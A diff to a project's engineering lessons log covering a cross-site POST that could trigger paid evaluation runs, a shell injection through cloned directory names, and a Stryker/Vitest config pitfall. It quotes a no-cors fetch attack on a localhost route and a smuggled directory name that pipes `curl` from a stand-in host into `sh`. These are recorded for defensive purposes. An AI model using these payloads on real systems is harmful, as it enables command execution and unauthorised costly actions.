@@ -25,6 +25,12 @@ the section guide and the promotion rule (a standing rule becomes one line under
 
 ## What Doesn't Work
 
+### 2026-10-12 — an id-less, bodyless POST that spends money is reachable from any web page, despite CORS
+**Symptom:** plan 34 review (SF1): `POST /eval/run-all` took no path id and no body; `fetch('http://localhost:3001/eval/run-all',{method:'POST',mode:'no-cors'})` from any visited page is a "simple" request, gets no preflight, and starts a paid suite run for every enabled agent. CORS (`app.ts`, `origin: config.webOrigin`) only stops the page from *reading* the response.
+**Cause:** the other paid POSTs (`/eval-cases/:id/runs`, `/agents/:id/eval-runs`, `/eval-runs/:id/promote`) are safe only because their path needs a server-issued UUID a cross-origin page cannot read; a route with neither an id nor an object body has no barrier at all.
+**Rule:** a mutating route with no unguessable path id must require a JSON object body — e.g. `body: z.object({ confirm: z.literal(true) })` — which forces `application/json` and so a preflight. It holds only because `server/src` registers no custom content-type parser (text/plain arrives as a string → 400, form-encoded → 415) and `fastify-type-provider-zod` uses plain `safeParse` (no coercion); adding a urlencoded or text→JSON parser silently reopens it. This does not cover DNS rebinding (the API binds `0.0.0.0`, no Host allowlist).
+**Evidence:** `server/src/modules/eval/routes.ts` run-all route + `EvalRunAllBody` in `vendor/shared/contracts/eval-pipeline.ts` · `server/test/eval-pipeline-runs.it.test.ts` (5 refused simple-request shapes, counts unchanged) · `docs/plans/34-eval-pipeline.md` Verification log, review iteration 1–2
+
 ### 2026-10-05 — a command allowlist that checks script names but not directory names still emits a copyable shell injection
 **Symptom:** plan 26 review (SF1, SF3): the onboarding run-command allowlist matched `cd <dir>` against raw `readdir` names, so a committed directory named `w;curl${IFS}evil|sh;x` produced `cd w;curl${IFS}evil|sh;x && npm run dev` with a Copy button; after the fix, a directory named `-` still produced `cd - && …` (jumps to the previous directory).
 **Cause:** only script names went through `SAFE_SCRIPT_RE`; directory names from the clone were trusted. git checks out names containing `;`, `|`, `$`, spaces, and option-like names.
@@ -207,6 +213,12 @@ callback at all · `specs/001-run-cost-badge.md` → "Postgres indexes the colum
 foreign key POINTS AT"
 
 ## Tool & Library Notes
+
+### 2026-10-12 — a "narrow" Stryker vitest config built with `mergeConfig` runs the whole suite and inflates the score
+**Symptom:** plan 34 S21: `vitest.mutation.config.ts` did `mergeConfig(baseConfig, { test: { include: ['test/eval-pipeline-scoring.test.ts'] } })`; the report claimed 175/179 killed (97.8 %), but `jq '.testFiles|keys' reports/mutation/mutation.json` listed 33 files incl. `.it` ones — 57 kills came from `eval-pipeline-runs.it.test.ts`. With the scope fixed: 170 killed, 9 survived, 3 of them real test gaps (e.g. `s.status === 'passed'` → `!==` in `aggregateRun` survived: nothing unit-tested the passed-case count).
+**Cause:** Vitest's `mergeConfig` concatenates array options, so `test.include` is appended to the base `['test/**/*.test.ts', 'src/**/*.test.ts']` instead of replacing it.
+**Rule:** build a mutation config by spreading the base and *replacing* `test.include` (and excluding `**/*.it.test.ts`); after every run check `jq '.testFiles|keys'` before trusting a score. Also: `inPlace: true` works with the `../reviewer-core/src` alias (the sandbox breakage research predicted did not happen), and a sort comparator's tie/greater-branch mutants (`a < b ? -1 : a > b ? 1 : 0`) are equivalent on V8 — list them, don't chase them.
+**Evidence:** `server/vitest.mutation.config.ts` · `server/stryker.config.json` · `pnpm mutation:eval-scoring` · `docs/plans/assets/34-eval-pipeline/mutation-report.md`
 
 ### 2026-10-05 — `.it` tests all skip with "Expected Reaper to map exposed port 8080"
 **Symptom:** every `*.it.test.ts` (even the long-stable `context.it`) reported `N skipped` plus `FAIL … Error: Expected Reaper to map exposed port 8080` from `testcontainers/src/reaper/reaper.ts:63`; a `testcontainers-ryuk-*` container was Up with `8080/tcp` but no host port.
